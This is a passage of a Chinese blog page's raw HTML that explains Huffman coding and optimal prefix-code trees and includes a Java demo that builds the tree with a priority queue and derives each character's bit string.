tree</li>\n<li>Best-first search algorithms</li>\n</ul>\n<p>这里简单介绍上述应用之一：<a href=\"https://en.wikipedia.org/wiki/Huffman_coding\" target=\"_blank\" rel=\"noopener\">Huffman coding</a>。</p>\n<p>Huffman编码是一种变长的编码方案，对于每一个字符，所对应的二进制位串的长度是不一致的，但是遵守如下原则：</p>\n<ul>\n<li>出现频率高的字符的二进制位串的长度小</li>\n<li>不存在一个字符<code>c</code>的二进制位串<code>s</code>是除<code>c</code>外任意字符的二进制位串的前缀</li>\n</ul>\n<p>遵守这样原则的Huffman编码属于变长编码，可以无损的压缩数据，压缩后通常可以节省20%-90%的空间，具体压缩率依赖于数据的固有结构。</p>\n<p>Huffman编码的实现就是要找到满足这两种原则的 <strong>字符-二进制位串</strong> 对照关系，即找到<strong>最优前缀码</strong>的编码方案（前缀码：没有任何字符编码后的二进制位串是其他字符编码后位串的前缀）。<br>\n这里我们需要用到二叉树来表达最优前缀码，该树称为<strong>最优前缀码树</strong><br>\n一棵最优前缀码树看起来像这样：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/88641060380e5ff72465ab16e99a9233.png\" alt=\"这里写图片描述\"></p>\n<p>算法思想：用一个属性为<code>freqeunce</code>关键字的最小优先队列Q,将当前最小的两个元素x,y合并得到一个新元素z（z.frequence = x.freqeunce + y.frequence）,<br>\n然后插入到优先队列中Q中，这样执行<code>n-1</code>次合并后，得到一棵最优前缀码树（这里不讨论算法的证明）。</p>\n<p>一个常见的构建流程如下：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/c8cfa4278ad1a5f379a0a9e83e4506d9.jpeg\" alt=\"这里写图片描述\"></p>\n<p>树中指向某个节点左孩子的边上表示位<code>0</code>,指向右孩子的边上的表示位<code>1</code>，这样遍历一棵最优前缀码树就可以得到对照表。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38743a7ae869495167\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nimport java.util.Comparator;\r\nimport java.util.HashMap;\r\nimport java.util.Map;\r\nimport java.util.PriorityQueue;\r\n\r\n/**\r\n * \r\n *                            root \r\n *                            /   \\ \r\n *                    --------- ---------- \r\n *                    |c:freq | | c:freq | \r\n *                    --------- ----------\r\n * \r\n *\r\n */\r\npublic class HuffmanEncodeDemo {\r\n\r\n\tpublic static void main(String[] args) {\r\n\t\t// TODO Auto-generated method stub\r\n\t\tNode[] n = new Node[6];\r\n\t\tfloat[] freq = new float[] { 9, 5, 45, 13, 16, 12 };\r\n\t\tchar[] chs = new char[] { 'e', 'f', 'a', 'b', 'd', 'c' };\r\n\t\tHuffmanEncodeDemo demo = new HuffmanEncodeDemo();\r\n\t\tNode root = demo.buildPrefixEncodeTree(n, freq, chs);\r\n\t\tMap&lt;Character, String&gt; collector = new HashMap&lt;&gt;();\r\n\t\tStringBuilder sb = new StringBuilder();\r\n\t\tdemo.tranversalPrefixEncodeTree(root, collector, sb);\r\n\t\tSystem.out.println(collector);\r\n\t\tString s = \"abcabcefefefeabcdbebfbebfbabc\";\r\n\t\tStringBuilder sb1 = new StringBuilder();\r\n\t\tfor (char c : s.toCharArray()) {\r\n\t\t\tsb1.append(collector.get(c));\r\n\t\t}\r\n\t\tSystem.out.println(sb1.toString());\r\n\t}\r\n\r\n\tpublic Node buildPrefixEncodeTree(Node[] n, float[] freq, char[] chs) {\r\n\t\tPriorityQueue&lt;Node&gt; pQ = new PriorityQueue&lt;&gt;(new Comparator&lt;Node&gt;() {\r\n\t\t\tpublic int compare(Node o1, Node o2) {\r\n\t\t\t\treturn o1.item.freq &gt; o2.item.freq ? 1 : o1.item.freq == o2.item.freq ? 0 : -1;\r\n\t\t\t};\r\n\t\t});\r\n\t\tNode e = null;\r\n\t\tfor (int i = 0; i &lt; chs.length; i++) {\r\n\t\t\tn[i] = e = new Node(null, null, new Item(chs[i], freq[i]));\r\n\t\t\tpQ.add(e);\r\n\t\t}\r\n\r\n\t\tfor (int i = 0; i &lt; n.length - 1; i++) {\r\n\t\t\tNode x = pQ.poll(), y = pQ.poll();\r\n\t\t\tNode z = new Node(x, y, new Item('$', x.item.freq + y.item.freq));\r\n\t\t\tpQ.add(z);\r\n\t\t}\r\n\t\treturn pQ.poll();\r\n\t}\r\n\t\r\n\t/**\r\n\t * tranversal  \r\n\t * @param root\r\n\t * @param collector\r\n\t * @param sb\r\n\t */\r\n\tpublic void tranversalPrefixEncodeTree(Node root, Map&lt;Character, String&gt; collector, StringBuilder sb) {\r\n\t\t// leaf node\r\n\t\tif (root.left == null &amp;&amp; root.right == null) {\r\n\t\t\tcollector.put(root.item.c, sb.toString());\r\n\t\t\treturn;\r\n\t\t}\r\n\t\tNode left = root.left, right = root.right;\r\n\t\ttranversalPrefixEncodeTree(left, collector, sb.append(0));\r\n\t\tsb.delete(sb.length() - 1, sb.length());\r\n\t\ttranversalPrefixEncodeTree(right, collector, sb.append(1));\r\n\t\tsb.delete(sb.length() - 1, sb.length());\r\n\t}\r\n\t\r\n}\r\n\r\nclass Node {\r\n\tpublic Node left, right;\r\n\tpublic Item item;\r\n\r\n\tpublic Node(Node left, Node right, Item item) {\r\n\t\tsuper();\r\n\t\tthis.left = left;\r\n\t\tthis.right = right;\r\n\t\tthis.item = item;\r\n\t}\r\n\r\n}\r\n\r\nclass Item {\r\n\tpublic char c;\r\n\tpublic float freq;\r\n\r\n\tpublic Item(char c, float freq) {\r\n\t\tsuper();\r\n\t\tthis.c = c;\r\n\t\tthis.freq = freq;\r\n\t}\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-81\">81</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-82\">82</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-83\">83</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-84\">84</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-85\">85</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-86\">86</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-87\">87</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-88\">88</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-89\">89</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-90\">90</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-91\">91</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-92\">92</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-93\">93</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-94\">94</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-95\">95</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-96\">96</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-97\">97</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-98\">98</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7ae869495167-99\">99</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7ae869495167-100\">100</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-1\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Comparator</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-2\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">HashMap</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Map</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-4\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">PriorityQueue</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-6\"><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-7\"><span class=\"crayon-c\"> * </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-8\"><span class=\"crayon-c\"> *                            root </span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-9\"><span class=\"crayon-c\"> *                            /   \\ </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-10\"><span class=\"crayon-c\"> *                    --------- ---------- </span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-11\"><span class=\"crayon-c\"> *                    |c:freq | | c:freq | </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-12\"><span class=\"crayon-c\"> *                    --------- ----------</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-13\"><span class=\"crayon-c\"> * </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-14\"><span class=\"crayon-c\"> *</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-15\"><span class=\"crayon-c\"> */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-16\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HuffmanEncodeDemo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-18\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-19\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// TODO Auto-generated method stub</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-20\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">Node</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Node</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-21\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">float</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">freq</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">float</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">45</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-22\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">char</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">chs</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'e'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'f'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'a'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'b'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'d'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'c'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-23\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">HuffmanEncodeDemo </span><span class=\"crayon-v\">demo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HuffmanEncodeDemo</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-24\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">Node </span><span class=\"crayon-v\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">demo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">buildPrefixEncodeTree</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">freq</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">chs</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-25\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">Map</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">collector</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HashMap</span><span class=\"crayon-o\">&lt;&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-26\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">StringBuilder </span><span class=\"crayon-v\">sb</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">StringBuilder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-27\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">demo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">tranversalPrefixEncodeTree</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">collector</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-28\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">collector</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-29\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"abcabcefefefeabcdbebfbebfbabc\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-30\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">StringBuilder </span><span class=\"crayon-v\">sb1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">StringBuilder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-31\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toCharArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-32\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">sb1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">collector</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">c</span><span 